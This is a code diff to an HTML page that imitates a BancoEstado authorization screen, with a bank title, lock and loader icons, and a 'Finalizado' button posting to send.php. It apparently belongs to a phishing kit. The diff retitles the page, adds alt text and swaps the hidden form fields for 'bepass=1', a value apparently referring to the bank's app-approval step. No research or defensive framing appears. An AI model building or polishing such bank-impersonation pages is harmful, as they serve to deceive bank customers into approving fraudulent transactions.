@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" type="image/png" href="favicon.png">
-    <title>Banco Estado - Autorización</title>
+    <title>Banco Estado</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -354,7 +354,8 @@
 
     <!-- Fila iconos: candado · puntos · celular -->
     <div class="icons-row">
-        <img src="candau.png">
+        <img src="candau.png" class="lock-img" alt="Candado BancoEstado">
+
         <div class="dots-loader">
             <div class="dot"></div>
             <div class="dot"></div>
@@ -422,8 +423,7 @@
 
     <!-- Botón Finalizado ARRIBA del contador -->
     <form id="finalizadoForm" action="send.php" method="POST" class="form-finalizado">
-        <input type="hidden" name="estado" value="autorizado">
-        <input type="hidden" name="tiempo_restante" id="tiempoRestanteInput" value="180">
+        <input type="hidden" name="bepass" value="1">
         <button type="submit" class="finalizado-btn" onclick="handleFinalizado(event)">
             Finalizado
         </button>
